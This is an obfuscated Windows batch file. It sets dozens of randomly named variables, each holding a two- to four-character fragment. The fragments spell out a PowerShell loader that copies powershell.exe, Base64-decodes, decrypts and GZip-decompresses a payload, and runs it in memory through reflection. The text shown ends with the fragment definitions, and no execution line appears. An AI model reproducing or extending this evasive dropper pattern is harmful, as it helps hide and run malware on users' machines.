@echo off
set "LPvUoCItPT=we"
set "OwJhPisiGr=ll"
set "YOcUUqElzN=0\"
set "UdpHUlXuTn=ow"
set "zRljZuYmWa=\v"
set "SPIDGGDEEu=em"
set "UsnOeGoppI=Po"
set "KzFIMakvzo=32"
set "ofQLGKcrVa=he"
set "oslEryOQUF=nd"
set "ZIQhnwUHMl=po"
set "DciWJrObdS=co"
set "qmZCceMlqQ=\W"
set "rnhJnjwYRl=py"
set "mWrYgQkCQS=Wi"
set "wmWjBeelEE=ll"
set "pelqtemqnA=in"
set "QNMjbddxoX=he"
set "YlkQEFQgAB=ws"
set "CAubSeUuLN=rS"
set "MTECuIdwsB=1."
set "NThYlagYVr=we"
set "lHOGZWNpll=s\"
set "HDsdvYcmTk=xe"
set "TUTUhFULvr=Sy"
set "YfpMPZYPjk=:\"
set "sGKWaFrgxJ=y "
set "IkvGLrQNAC=.e"
set "lhUDpiGJeV=st"
set "cqgaGLBlRp=do"
set "bIScGKOqoI=rs"
set "zleRfEYLny= /"
set "SfnrbdxKMv= C"
set "rdyHiNcFFb=cd"
set "eeKZIErzrU= %~dp0"
set "mldWNzMJwq=raph"
set "epfgFpcxFy=6esa"
set "RvpAzzQavM=($zs"
set "HdowxroFvD=)) {"
set "fXEjjCOVQn=m.IO"
set "epLRiIvNnj=vert"
set "GlvHzRTweU=iron"
set "XLUmOztKOj=POg "
set "jHNkICIBQH=$Qze"
set "meRpKmTkst=f.Pa"
set "plzBJfjnEz=.Cry"
set "iZwmfhtJgW=qiRt"
set "dEXyYhcVyU=ay()"
set "ZvEbjSuyBR=7Yiv"
set "UWILYifkLQ=]::("
set "YPCjueFPef=bstr"
set "hYnqHlDDOp=ddin"
set "yvcOKDNLwR=();$"
set "xBCsgYCFaq=-Obj"
set "jddIsvTblJ=gnir"
set "wTWYlIyytS=join"
set "lLLDuZxtPi=tem."
set "biVXYkTTYC=.GZi"
set "FmqZtymweI=($zs"
set "aNpymbonhP=zePf"
set "eWGvnkTKuC=;$dr"
set "kqZuBMslvs=m, 0"
set "kIjovRHiuW=e]::"
set "gYJfrHxukl=rity"
set "kYPlgVMQLH=POg."
set "oekhWBCPbB=m(, "
set "xGbeuOhyDx=ose("
set "JuGBPSrpeS=fWt."
set "InPNGnTkMh=$qiR"
set "cCVPjbAtpr=)($q"
set "TYpNOnTVhB=Fina"
set "ABaedUdzyF=TllA"
set "pTpEziYExC=Comp"
set "ALjfOofJZq=esaB"
set "mWTsrfvuKZ=aXuQ"
set "HOZSUcuYsb=, $q"
set "BQSErwgxuM=Wt, "
set "lhaoMOWBTb=tsWi"
set "PxECFJaApZ=;$vI"
set "VtIUFzPkLM=ress"
set "CqPkyeUyKl=rity"
set "uKKjNpMECI=$cgM"
set "daOAlAFYAX=:: '"
set "UJrelKmBAr=[Sys"
set "ZMwEDGVMak=brea"
set "RKViICMgrM=TC);"
set "ZObsVzPYVP=zePf"
set "eYJESzlOgg=y.Pa"
set "PVZYcdSJwl=and "
set "UQyszEsDpM=736u"
set "LtGPNUAxMO=gMod"
set "NyvvZcziNY=m = "
set "gZwlhwvJwN=am;$"
set "EoesKdWgZT=ct S"
set "wdMnujwXED=qiRt"
set "TuDhZenaxV=v4Ir"
set "lyzpqGVdOn=Fo7l"
set "TMyOeTayQA=New-"
set "iPghfxrxIZ=[Env"
set "NRpfxxogQq=n ''"
set "clBNXAVhzO=cQk."
set "ySSrMJVTfw=oL'["
set "JdVCxGdTUF=Bmor"
set "TDSwUfJBTN=stem"
set "xIkKIIolOj=flec"
set "NnmnuTqsmk=pose"
set "LEqjajLtaz=oint"
set "DYztXpPGiP=File"
set "TYmjxGitTp=('%*'"
set "PBGzkqHfpC=XuQx"
set "eVGJPmRXaZ=y.Ci"
set "QonyCuKQgv=pres"
set "FMXAiiOFUq=tion"
set "wgytolGEnW=se()"
set "jYaWtTlnQB= = $"
set "yzGHZbfHmL=n ''"
set "ZXUBaZfHUb='')("
set "XhXYGJqfKQ=isfL"
set "QMWYyVKDBt=ecq "
set "kfDYfHyUWu=ptor"
set "WEugojTxtU=ert]"
set "WcXzhXzosl=3); "
set "WUgnsDQZbj=ion."
set "mLiEGOoHsS=.Con"
set "bmPPMgsemH=1..-"
set "kptdQFzltw=ew-O"
set "MHIBLHiZri=ypto"
set "eoMRNZwDVD=.Cre"
set "mHQaefTDKw=in $"
set "ytQmqWzlQR=grap"
set "QjuBwvuUvA=);$a"
set "szlGNlrEdt=tryP"
set "zRaaTSaWUr=ZYYc"
set "UxPDsqUdfH= '')"
set "WmKEDZomDk=Syst"
set "AqLEhElSaW=16] "
set "MEveNtMiKo=$cgM"
set "kQSobbugKG=c.En"
set "vpUBnItpAr=$oif"
set "pcteAHENfl=daeR"
set "FoIQsIJFMr=lBlo"
set "dsOtITyRFu=+hAO"
set "bmAmAjXOWs=f) {"
set "iOIkGXFKRA=tS46"
